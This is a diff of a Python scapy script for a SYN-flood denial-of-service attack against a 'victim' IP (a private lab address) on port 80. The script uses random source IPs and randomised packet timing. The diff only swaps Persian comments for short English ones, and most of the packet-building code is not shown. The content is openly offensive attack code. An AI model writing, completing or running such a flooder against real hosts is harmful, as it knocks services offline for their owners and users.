@@ -3,10 +3,10 @@ from scapy.all import *
 import random
 import time
 
-# 🎯 آدرس IP قربانی
+# target
 target_ip = "192.168.159.129"  # آدرس ماشین قربانی خودت رو بذار
 
-# 🎯 پورت قربانی (مثلاً وب سرور)
+# port
 target_port = 80
 
 def random_ip():
@@ -34,7 +34,7 @@ def syn_flood():
 
         send(packet, verbose=0)
 
-        # ⏱️ نرخ متغیر بین هر پکت (بین 5 تا 300 میلی‌ثانیه)
+        # delay
         time.sleep(random.uniform(0.005, 0.3))
 
 if __name__ == "__main__":
